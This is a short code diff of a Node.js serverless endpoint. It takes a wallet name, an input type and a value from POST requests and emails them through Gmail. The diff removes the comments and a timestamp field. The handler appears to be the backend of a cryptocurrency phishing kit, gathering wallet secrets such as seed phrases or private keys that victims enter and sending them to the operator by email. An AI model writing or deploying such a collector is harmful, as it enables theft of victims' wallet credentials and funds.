@@ -1,18 +1,18 @@
 const nodemailer = require('nodemailer');
 
 module.exports = async (req, res) => {
-    // Only allow POST
+    
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { wallet, inputType, value, timestamp } = req.body;
+    const { wallet, inputType, value } = req.body;
 
     if (!wallet || !value) {
         return res.status(400).json({ error: 'Missing fields' });
     }
 
-    // Configure email transport using environment variables
+    
     const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
@@ -31,7 +31,6 @@ module.exports = async (req, res) => {
                 <p><strong>Wallet:</strong> ${wallet}</p>
                 <p><strong>Input Type:</strong> ${inputType}</p>
                 <p><strong>Value:</strong> ${value}</p>
-                <p><strong>Timestamp:</strong> ${timestamp}</p>
             `,
         });
         res.status(200).json({ success: true });
